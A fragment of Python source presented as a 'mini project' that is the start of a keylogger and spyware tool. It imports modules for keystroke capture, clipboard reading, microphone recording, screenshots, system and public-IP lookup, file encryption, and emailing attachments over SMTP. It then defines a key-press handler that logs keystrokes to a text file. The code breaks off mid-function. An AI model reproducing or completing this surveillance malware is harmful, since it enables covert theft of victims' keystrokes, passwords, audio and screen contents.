# python-mini-project

#Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

#collecting computer informations

import socket
import platform

import win32clipboard

#keystrokes
from pynput.keyboard import Key, Listener

#track time
import time
import os


#microphones with sound devices  module

from scipy.io.wavfile import write
import  sounddevice as sd


#encypt files > use crypto library

from cryptography.fernet import Fernet

import getpass
from requests import get    # more computer info

from multiprocessing import Process, freeze_support   #screenshot functionalality
from PIL import ImageGrab

# All libraries imported till here

#......


#keylogger - itself segment

#keys created will be appended to
keys_information = "key_log.txt"

#file path itself
file_path = "C:\\Users\\ankit\\PycharmProjects\\pythonProject\\Projects"
extend = "\\"   # for accessing keylog text file

count = 0
keys = []
def on_press(key):
    global keys, count

    print(key)
    keys.append(key)

    count += 1

def write_file(keys):     #write function to write keys to specific file
    with open(file_path + extend + keys_information, "a") as f:
        

